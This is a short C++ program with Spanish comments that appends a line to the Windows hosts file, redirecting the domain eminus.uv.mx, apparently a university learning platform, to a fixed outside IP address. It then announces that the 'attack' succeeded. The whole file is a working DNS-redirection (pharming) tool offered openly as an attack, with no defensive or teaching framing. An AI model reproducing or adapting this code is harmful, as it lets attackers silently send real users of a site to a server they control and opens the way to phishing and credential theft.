#include <iostream>
#include <fstream>
using namespace std;

int main() {
    /*
        Abrimos el archivo hosts de la máquina. Las banderas indican
        que es para escritura al final del archivo.
    */
    ofstream myFile("C:\\Windows\\System32\\drivers\\etc\\hosts", ios::out | ios::app);

    if (myFile.is_open()) {
        myFile << "\n20.225.187.207 eminus.uv.mx";
        myFile.close();
        cout << "¡Ataque realizado con éxito!\n";
    } else {
        cout << "El programa requiere permisos de administrador para ejecutarse correctamente.\n";
    }

    cout << "Presiona la tecla Enter para salir...\n";
    cin.get();
    return 0;
}


